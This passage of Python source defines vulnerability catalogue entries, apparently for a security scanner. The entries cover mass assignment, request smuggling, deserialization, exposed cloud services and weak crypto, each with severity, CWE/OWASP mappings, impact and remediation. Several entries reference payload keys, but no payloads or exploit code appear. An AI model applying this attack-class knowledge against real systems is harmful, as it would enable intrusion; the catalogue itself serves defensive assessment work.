         desc="An API response includes the full internal object representation including sensitive fields, relying on the client to filter.",
         impact="Sensitive field disclosure even when the UI does not render it.",
         rec="Define explicit response schemas/DTOs per endpoint that include only fields the client is authorised to see.",
         tags=["api","information-disclosure"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="ASSETMGMT-001", title="Improper API Inventory Management", aliases=["Shadow/Zombie API Exposure"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-1059", owasp="API9:2023-Improper Inventory Management", capec="CAPEC-116", av=AttackVector.NETWORK,
         desc="Deprecated, beta, or undocumented API versions remain deployed and reachable, often without controls applied to the current version.",
         impact="Attackers bypass current-version security fixes by targeting an older or forgotten API version.",
         rec="Maintain an authoritative API inventory, decommission deprecated versions promptly.",
         tags=["api","inventory","configuration"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="MASSASSIGN-001", title="Mass Assignment", aliases=["Autobinding Vulnerability","Object Injection via Mass Assignment"],
         category=Category.API_SECURITY, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-915", owasp="API3:2023-Broken Object Property Level Authorization", capec="CAPEC-186", av=AttackVector.NETWORK,
         desc="A create/update endpoint binds the entire request body directly onto an internal model without an allowlist.",
         impact="Privilege escalation or data tampering by setting protected fields through an otherwise legitimate endpoint.",
         rec="Explicitly allowlist bindable fields per endpoint rather than binding the full request body to the model.",
         tags=["mass-assignment","api"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="PROTOPOLL-001", title="Prototype Pollution", aliases=["JavaScript Prototype Pollution"],
         category=Category.API_SECURITY, severity=Severity.HIGH, cvss=7.3, vector="AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:L",
         cwe="CWE-1321", owasp="A03:2021-Injection", capec="CAPEC-248", av=AttackVector.NETWORK,
         desc="A recursive merge/clone routine allows a __proto__ or constructor.prototype key in attacker-controlled input to pollute the base Object prototype.",
         impact="Ranges from DoS and logic bypass through to RCE when a polluted property is used unsafely.",
         rec="Use Object.create(null) or Map for merge targets, freeze the base Object.prototype, and reject __proto__/constructor/prototype keys during deep-merge.",
         tags=["prototype-pollution","javascript"], confidence="Confirmed", exploit=Exploitability.MODERATE, payload_key="prototype_pollution"),
    dict(id="WEBHOOK-001", title="Webhook Endpoint Abuse", aliases=["Webhook SSRF/Spoofing"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-918", owasp="A10:2021-Server-Side Request Forgery", capec="CAPEC-664", av=AttackVector.NETWORK,
         desc="A webhook feature does not verify HMAC signature on incoming events or allows registering arbitrary internal callback URLs.",
         impact="Forged webhook events triggering unintended behaviour, or SSRF via unvalidated callback URL.",
         rec="Verify an HMAC signature on every inbound webhook, validate outbound callback destination URLs.",
         tags=["webhook","api","ssrf"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="WS-001", title="Insecure WebSocket Implementation", aliases=["WebSocket Issues"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-346", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-60", av=AttackVector.NETWORK,
         desc="A WebSocket endpoint does not validate the Origin header at handshake time and/or does not re-check authorization on every message.",
         impact="A malicious webpage can open a WebSocket connection using the victim's cookies and exchange data with the backend as the victim.",
         rec="Validate the Origin header against an allowlist during the WebSocket handshake; require an explicit auth token.",
         tags=["websocket","api"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="GRPC-001", title="Insecure gRPC Service Configuration", aliases=["gRPC Issues"],
         category=Category.API_SECURITY, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="A gRPC service is exposed without mutual TLS or per-method authorization, and reflection is left enabled in production.",
         impact="Unauthorized invocation of internal service methods.",
         rec="Disable server reflection in production, require mTLS or token-based auth per call.",
         tags=["grpc","api","configuration"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="CACHEPOISON-001", title="Web Cache Poisoning", aliases=["Cache Poisoning"],
         category=Category.CONFIGURATION, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:H/A:N",
         cwe="CWE-444", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-141", av=AttackVector.NETWORK,
         desc="An unkeyed HTTP input influences the response body but is not part of the cache key, allowing an attacker to poison the shared cache.",
         impact="Mass client-side attack served to every user who requests the poisoned cached URL.",
         rec="Ensure the cache key includes every header/parameter that influences the response.",
         tags=["cache-poisoning","http"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="SMUGGLE-001", title="HTTP Request Smuggling", aliases=["Request Smuggling"],
         category=Category.CONFIGURATION, severity=Severity.HIGH, cvss=8.1, vector="AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
         cwe="CWE-444", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-33", av=AttackVector.NETWORK,
         desc="A front-end proxy and back-end server disagree on HTTP request boundaries, allowing an attacker to smuggle a hidden second request.",
         impact="Bypass of front-end access controls, request queue poisoning, and cache poisoning at scale.",
         rec="Use HTTP/2 end-to-end; ensure consistent, standards-compliant parsing between hops.",
         tags=["request-smuggling","http"], confidence="Confirmed", exploit=Exploitability.DIFFICULT, payload_key="http_smuggling"),
    dict(id="DESYNC-001", title="HTTP Desync Attack", aliases=["HTTP Desync"],
         category=Category.CONFIGURATION, severity=Severity.HIGH, cvss=8.1, vector="AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
         cwe="CWE-444", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-33", av=AttackVector.NETWORK,
         desc="Connection reuse between a load balancer and origin server becomes desynchronised, causing one client's request data to be prepended to another client's request.",
         impact="Response queue poisoning leading to session/data leakage between unrelated users.",
         rec="Enforce HTTP/1.1 keep-alive consistency between hops, or upgrade to HTTP/2.",
         tags=["http-desync","http"], confidence="Tentative", exploit=Exploitability.DIFFICULT),
    dict(id="HOSTHDR-001", title="Host Header Injection", aliases=["Host Header Attack"],
         category=Category.CONFIGURATION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-644", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-593", av=AttackVector.NETWORK,
         desc="The application trusts the client-supplied Host header to build absolute URLs without validating it against the expected domain.",
         impact="Password-reset-link poisoning and potential cache poisoning.",
         rec="Validate the Host header against an allowlist of expected values.",
         tags=["host-header","configuration"], confidence="Confirmed", exploit=Exploitability.MODERATE),
    dict(id="HPP-001", title="HTTP Parameter Pollution", aliases=["HPP"],
         category=Category.CONFIGURATION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-235", owasp="A03:2021-Injection", capec="CAPEC-460", av=AttackVector.NETWORK,
         desc="Supplying the same parameter name multiple times causes different application layers to pick different values, which can bypass validation or WAF rules.",
         impact="Validation/WAF bypass by hiding a malicious parameter value behind a benign duplicate.",
         rec="Explicitly define and enforce single-value handling for parameters at the framework/gateway layer.",
         tags=["hpp","http"], confidence="Tentative", exploit=Exploitability.MODERATE, payload_key="hpp"),
    dict(id="JSONP-001", title="JSONP Callback Injection", aliases=["JSONP Injection"],
         category=Category.CLIENT_SIDE, severity=Severity.MEDIUM, cvss=6.1, vector="AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
         cwe="CWE-352", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-593", av=AttackVector.NETWORK,
         desc="A JSONP endpoint reflects an attacker-supplied callback parameter name directly into the response without validation.",
         impact="Cross-site data leakage and reflected script injection via a crafted callback name.",
         rec="Validate the callback parameter against a strict alphanumeric allowlist; prefer CORS-protected JSON APIs over JSONP.",
         tags=["jsonp","client-side"], confidence="Tentative", exploit=Exploitability.MODERATE, payload_key="jsonp"),
    dict(id="XMLINJ-001", title="XML Injection", aliases=["XML Node/Attribute Injection"],
         category=Category.INJECTION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
         cwe="CWE-91", owasp="A03:2021-Injection", capec="CAPEC-250", av=AttackVector.NETWORK,
         desc="User input is inserted into an XML document without escaping reserved characters, allowing injection of extra nodes or attributes.",
         impact="Manipulation of application logic that trusts the resulting XML structure.",
         rec="Use an XML library's element/attribute construction APIs rather than string concatenation.",
         tags=["xml","injection"], confidence="Tentative", exploit=Exploitability.MODERATE, payload_key="xml_injection"),
    dict(id="XMLBOMB-001", title="XML Entity Expansion (Billion Laughs)", aliases=["XML Bomb"],
         category=Category.XXE, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
         cwe="CWE-776", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-197", av=AttackVector.NETWORK,
         desc="A small XML document defines nested entities that expand exponentially when parsed, exhausting memory/CPU.",
         impact="Denial of service against any service that parses attacker-supplied XML.",
         rec="Configure the XML parser with entity expansion limits; disable DTD processing entirely.",
         tags=["xml","dos"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="REDOS-001", title="Regular Expression Denial of Service", aliases=["ReDoS"],
         category=Category.BUSINESS_LOGIC, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
         cwe="CWE-1333", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-492", av=AttackVector.NETWORK,
         desc="A regular expression with catastrophic backtracking behaviour is applied to user-controlled input.",
         impact="Denial of service against a single-threaded or resource-constrained backend component.",
         rec="Audit regular expressions for catastrophic backtracking; apply input length limits before regex evaluation.",
         tags=["redos","dos"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="DESER-001", title="Insecure Deserialization", aliases=["Unsafe Deserialization"],
         category=Category.DESERIALIZATION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-502", owasp="A08:2021-Software and Data Integrity Failures", capec="CAPEC-586", av=AttackVector.NETWORK,
         desc="Attacker-controlled data is deserialized using a native object serialization format without integrity verification.",
         impact="Remote code execution via gadget-chain execution.",
         rec="Avoid deserializing untrusted data with native formats; sign/verify the payload before deserializing.",
         tags=["deserialization","rce","critical"], confidence="Confirmed", exploit=Exploitability.DIFFICULT, related=["DESER-002","DESER-003","DESER-004"]),
    dict(id="DESER-002", title="PHP Object Injection", aliases=["PHP unserialize() Vulnerability"],
         category=Category.DESERIALIZATION, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-502", owasp="A08:2021-Software and Data Integrity Failures", capec="CAPEC-586", av=AttackVector.NETWORK,
         desc="Attacker-supplied data reaches PHP's unserialize() allowing instantiation of arbitrary objects via magic methods.",
         impact="Remote code execution or arbitrary file operations.",
         rec="Replace unserialize() with JSON encoding for any data crossing a trust boundary.",
         tags=["php","deserialization","rce"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="DESER-003", title="Java Unsafe Deserialization", aliases=["Java Deserialization RCE"],
         category=Category.DESERIALIZATION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-502", owasp="A08:2021-Software and Data Integrity Failures", capec="CAPEC-586", av=AttackVector.NETWORK,
         desc="An endpoint accepts a serialized Java object stream from an untrusted source, allowing known gadget chains to achieve execution.",
         impact="Remote code execution, commonly seen in legacy Java application servers.",
         rec="Avoid native Java serialization for untrusted data; apply look-ahead deserialization filters (JEP 290).",
         tags=["java","deserialization","rce"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="DESER-004", title="Insecure .NET ViewState Deserialization", aliases=[".NET ViewState Vulnerability"],
         category=Category.DESERIALIZATION, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-502", owasp="A08:2021-Software and Data Integrity Failures", capec="CAPEC-586", av=AttackVector.NETWORK,
         desc="ViewState is deserialized using BinaryFormatter without MAC validation, allowing a crafted ViewState blob to trigger a gadget chain.",
         impact="Remote code execution against ASP.NET WebForms applications.",
         rec="Enable ViewState MAC validation and encryption; keep the machineKey secret.",
         tags=["dotnet","deserialization","rce"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="S3-001", title="Publicly Writable/Readable Cloud Storage Bucket", aliases=["S3 Bucket Exposure"],
         category=Category.CLOUD, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-561", av=AttackVector.NETWORK,
         desc="A cloud object storage bucket is configured with public list/read/write access beyond what is required.",
         impact="Disclosure of sensitive files or supply-chain compromise if a writable bucket serves application assets.",
         rec="Apply least-privilege bucket policies; block public access at the account level by default.",
         tags=["cloud","s3","exposure"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="FIREBASE-001", title="Misconfigured Firebase Realtime Database Rules", aliases=["Firebase Exposure"],
         category=Category.CLOUD, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-561", av=AttackVector.NETWORK,
         desc="Firebase security rules are configured with unauthenticated read/write access to the entire database tree.",
         impact="Full read/write access to application data without any authentication.",
         rec="Write explicit per-path Firebase security rules scoped to authenticated user data.",
         tags=["cloud","firebase","exposure"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="K8S-001", title="Exposed Kubernetes API Server", aliases=["Kubernetes API Exposure"],
         category=Category.CLOUD, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="The Kubernetes API server is reachable from the public internet with anonymous authentication enabled or overly permissive RBAC bindings.",
         impact="Full control over the cluster's workloads, including deploying malicious pods with host-level access.",
         rec="Restrict API server access to a private network/VPN; disable anonymous authentication; enforce least-privilege RBAC.",
         tags=["cloud","kubernetes","exposure"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="DOCKER-001", title="Exposed Docker API", aliases=["Docker API Exposure"],
         category=Category.CLOUD, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="The Docker daemon's remote API is exposed without TLS client authentication.",
         impact="Trivial host takeover by launching a privileged container that mounts the host filesystem.",
         rec="Never expose the Docker API without mutual TLS authentication; bind to a local socket or private management network.",
         tags=["cloud","docker","exposure","critical"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="GITEXP-001", title="Exposed .git Directory", aliases=["Git Exposure"],
         category=Category.SUPPLY_CHAIN, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-538", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-150", av=AttackVector.NETWORK,
         desc="The .git directory is deployed alongside application code and is reachable over HTTP.",
         impact="Full source code disclosure and recovery of historical secrets.",
         rec="Exclude .git and other VCS metadata from the deployed artefact; scan repository history for committed secrets in CI.",
         tags=["git","supply-chain","exposure"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="BACKUP-001", title="Exposed Backup Files", aliases=["Backup Files"],
         category=Category.INFO_DISCLOSURE, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-530", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-150", av=AttackVector.NETWORK,
         desc="Editor/deployment backup files (index.php~, config.php.bak, site.zip) are left inside the web root.",
         impact="Full source code and configuration/credential disclosure via a single unauthenticated download.",
         rec="Exclude backup and editor swap files from deployment artefacts; configure the web server to deny access to common backup extensions.",
         tags=["exposure","information-disclosure"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="OPENAPI-001", title="Exposed OpenAPI/Swagger Definition", aliases=["OpenAPI Exposure","Swagger Exposure"],
         category=Category.INFO_DISCLOSURE, severity=Severity.MEDIUM, cvss=5.3, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
         cwe="CWE-200", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-116", av=AttackVector.NETWORK,
         desc="A Swagger/OpenAPI schema or interactive documentation UI is publicly reachable.",
         impact="Accelerates attacker reconnaissance by providing a ready-made map of every endpoint.",
         rec="Restrict interactive API documentation to authenticated/internal access in production.",
         tags=["api","information-disclosure","swagger"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="APIKEY-001", title="Exposed API Key in Client-Side Code", aliases=["API Key Exposure"],
         category=Category.SUPPLY_CHAIN, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-798", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-150", av=AttackVector.NETWORK,
         desc="A secret API key intended for server-side use is embedded in client-side JavaScript or a public repository.",
         impact="Unauthorized use of the third-party service under the victim's billing account/quota.",
         rec="Never embed server-side secrets in client-distributed code; proxy third-party API calls through a backend.",
         tags=["secrets","supply-chain","exposure"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="HARDCODEDSEC-001", title="Hardcoded Credentials in Source Code", aliases=["Hardcoded Secrets"],
         category=Category.SUPPLY_CHAIN, severity=Severity.HIGH, cvss=8.2, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
         cwe="CWE-798", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-150", av=AttackVector.NETWORK,
         desc="Database passwords, encryption keys, or service credentials are hardcoded directly in source code.",
         impact="Compromise of the credentialed resource by anyone who obtains the source.",
         rec="Load secrets exclusively from a secrets manager or environment configuration injected at deploy time.",
         tags=["secrets","supply-chain"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="CREDLEAK-001", title="Credential Leakage via Insecure Channel", aliases=["Credential Leakage"],
         category=Category.INFO_DISCLOSURE, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-522", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-117", av=AttackVector.ADJACENT,
         desc="Credentials or session tokens are transmitted over an unencrypted channel.",
         impact="Interception and reuse of valid credentials by anyone able to observe network traffic.",
         rec="Enforce TLS end-to-end including for internal service-to-service traffic; enable HSTS.",
         tags=["credentials","network","crypto"], confidence="Tentative", exploit=Exploitability.DIFFICULT),
    dict(id="CRYPTO-001", title="Use of Weak or Broken Cryptographic Algorithm", aliases=["Weak Cryptography"],
         category=Category.CRYPTO, severity=Severity.MEDIUM, cvss=5.9, vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
         cwe="CWE-327", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-97", av=AttackVector.NETWORK,
         desc="The application uses a deprecated or broken algorithm (MD5/SHA1 for password hashing, DES/RC4 for encryption) for a security-sensitive purpose.",
         impact="Reduced resistance to offline attack, ranging from faster password cracking to plaintext recovery.",
         rec="Use current recommended primitives: bcrypt/scrypt/Argon2id for password hashing, AES-GCM for symmetric encryption.",
         tags=["crypto","hardening"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="CRYPTO-002", title="Insecure Randomness for Security Tokens", aliases=["Insecure Randomness"],
         category=Category.CRYPTO, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-330", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-97", av=AttackVector.NETWORK,
         desc="A password-reset token, API key, or session identifier is generated using a non-cryptographic PRNG, making it predictable.",
         impact="Full account takeover by predicting a token intended to be unguessable.",
         rec="Generate all security-sensitive tokens using a CSPRNG (e.g. secrets module in Python, crypto.randomBytes in Node.js).",
         tags=["crypto","tokens"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="CRYPTO-003", title="Padding Oracle Vulnerability", aliases=["Padding Oracle Attack"],
         category=Category.CRYPTO, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-696", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-463", av=AttackVector.NETWORK,
         desc="A CBC-mode decryption routine returns a distinguishable error for padding failures, enabling arbitrary ciphertext decryption.",
         impact="Full decryption of encrypted data (e.g. session cookies, ViewState) without knowledge of the key.",
         rec="Use AES-GCM instead of unauthenticated CBC; return identical generic errors for all decryption failures.",
         tags=["crypto","padding-oracle"], confidence="Tentative", exploit=Exploitability.DIFFICULT),
    dict(id="CRYPTO-004", title="Improper TLS Certificate Validation", aliases=["Certificate Validation Bypass"],
         category=Category.CRYPTO, severity=Severity.HIGH, cvss=7.4, vector="AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-295", owasp="A02:2021-Cryptographic Failures", capec="CAPEC-459", av=AttackVector.ADJACENT,
         desc="An HTTP client or mobile app disables TLS certificate/hostname validation, typically left over from development debugging.",
         impact="Susceptibility to man-in-the-middle interception and tampering.",
         rec="Never disable certificate validation outside of isolated test environments.",
         tags=["crypto","tls"], confidence="Confirmed", exploit=Exploitability.DIFFICULT),
    dict(id="REDIS-001", title="Unauthenticated Redis Instance", aliases=["Redis Exposure"],
         category=Category.NETWORK_SERVICE, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-306", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="A Redis instance is reachable on the network without requirepass authentication configured.",
         impact="Full data read/write, cache/session poisoning, and in many configurations remote code execution.",
         rec="Set a strong requirepass; bind Redis to a private interface; enable protected-mode; disable dangerous commands.",
         tags=["redis","network-service","critical"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="ES-001", title="Unauthenticated Elasticsearch Instance", aliases=["Elasticsearch Exposure"],
         category=Category.NETWORK_SERVICE, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-306", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="An Elasticsearch/Kibana instance is reachable without authentication, exposing every indexed document.",
         impact="Bulk data exfiltration and index deletion causing data loss.",
         rec="Enable Elasticsearch security features (authentication and TLS); restrict network access.",
         tags=["elasticsearch","network-service"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="MONGO-001", title="Unauthenticated MongoDB Instance", aliases=["MongoDB Exposure"],
         category=Category.NETWORK_SERVICE, severity=Severity.CRITICAL, cvss=9.8, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
         cwe="CWE-306", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="A MongoDB instance is bound to a public interface with authentication disabled.",
         impact="Full database compromise, frequently followed by ransom-note collection replacement.",
         rec="Enable MongoDB authentication and RBAC; bind to a private network interface; require TLS.",
         tags=["mongodb","network-service","critical"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="MEMCACHED-001", title="Exposed Memcached Instance", aliases=["Memcached Exposure"],
         category=Category.NETWORK_SERVICE, severity=Severity.HIGH, cvss=8.2, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:H",
         cwe="CWE-306", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="A Memcached instance is reachable on UDP/TCP 11211 without authentication.",
         impact="Disclosure of cached data and abuse as a DDoS amplification vector.",
         rec="Bind Memcached to localhost/private network only; disable UDP if not required.",
         tags=["memcached","network-service"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="SMTP-001", title="SMTP Open Relay", aliases=["Open Mail Relay"],
         category=Category.NETWORK_SERVICE, severity=Severity.HIGH, cvss=7.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="An SMTP server accepts and relays mail from unauthenticated third parties to arbitrary destination domains.",
         impact="Abuse of mail infrastructure and reputation for spam/phishing campaigns.",
         rec="Restrict relaying to authenticated users and explicitly trusted source IP ranges.",
         tags=["smtp","network-service"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="FTP-001", title="FTP Anonymous Access Enabled", aliases=["FTP Anonymous Access"],
         category=Category.NETWORK_SERVICE, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-284", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="An FTP server permits anonymous login, exposing files and in write-enabled configurations allowing file upload.",
         impact="Disclosure of files not intended to be public, or hosting of attacker-supplied content.",
         rec="Disable anonymous FTP access; require authenticated accounts; prefer SFTP/FTPS.",
         tags=["ftp","network-service"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="SNMP-001", title="SNMP Default Community String", aliases=["SNMP Default Community"],
         category=Category.NETWORK_SERVICE, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-521", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-115", av=AttackVector.NETWORK,
         desc="An SNMP-enabled device responds to the well-known default community string 'public' or 'private'.",
         impact="Disclosure of network topology/device config, or full device reconfiguration.",
         rec="Change default community strings; prefer SNMPv3 with authentication and encryption.",
         tags=["snmp","network-service"], confidence="Confirmed", exploit=Exploitability.EASY),
    dict(id="DEFAULTCRED-001", title="Default or Well-Known Credentials", aliases=["Default Credentials"],
         category=Category.NETWORK_SERVICE, severity=Severity.CRITICAL, cvss=9.1, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
         cwe="CWE-798", owasp="A07:2021-Identification and Authentication Failures", capec="CAPEC-70", av=AttackVector.NETWORK,
         desc="A service, device, or application is still using vendor-default or widely-known credentials that were never changed.",
         impact="Immediate unauthorized access, frequently full administrative control.",
         rec="Force mandatory credential change on first use for every default account; audit periodically.",
         tags=["default-credentials","network-service"], confidence="Confirmed", exploit=Exploitability.TRIVIAL),
    dict(id="EMAILHDRI-001", title="Email Header Injection", aliases=["SMTP Header Injection"],
         category=Category.INJECTION, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
         cwe="CWE-93", owasp="A03:2021-Injection", capec="CAPEC-105", av=AttackVector.NETWORK,
         desc="A user-controlled field is placed into an outgoing email's headers without stripping CR/LF.",
         impact="Abuse of the application's mail-sending functionality to spam arbitrary third parties.",
         rec="Strip or reject CR/LF from any user input used to construct email headers.",
         tags=["email","injection"], confidence="Confirmed", exploit=Exploitability.EASY, payload_key="crlf"),
    dict(id="WEBVIEW-001", title="Insecure Mobile WebView Configuration", aliases=["Insecure WebView"],
         category=Category.CLIENT_SIDE, severity=Severity.HIGH, cvss=7.4, vector="AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N",
         cwe="CWE-927", owasp="A05:2021-Security Misconfiguration", capec="CAPEC-233", av=AttackVector.NETWORK,
         desc="A mobile application's WebView enables JavaScript bridge interfaces or loads arbitrary/attacker-influenceable URLs.",
         impact="Native-level code execution or sensitive data access from loaded malicious or compromised web content.",
         rec="Avoid exposing native interfaces to WebView JavaScript; restrict navigable origins to an allowlist.",
         tags=["mobile","webview","client-side"], confidence="Tentative", exploit=Exploitability.MODERATE),
    dict(id="DNSREBIND-001", title="DNS Rebinding", aliases=["DNS Rebinding Attack"],
         category=Category.SSRF, severity=Severity.MEDIUM, cvss=6.5, vector="AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
         cwe="CWE-346", owasp="A10:2021-Server-Side Request Forgery", capec="CAPEC-664", av=AttackVector.NETWORK,
         desc="An attacker can rebind a controlled hostname's DNS to an internal IP after the initial check but before the connection.",
         impact="Bypass of hostname-based SSRF or origin protections, allowing access to internal-only services.",
         rec="Validate the resolved IP address at connection time and re-validate on every request.",
         tags=["dns-rebinding","ssrf"], confidence="Tentative", exploit=Exploitability.DIFFICULT),
    dict(id="SUBTAKEOVER-001", title="Subdomain Takeover", aliases=["Dangling DNS Record Takeover"],
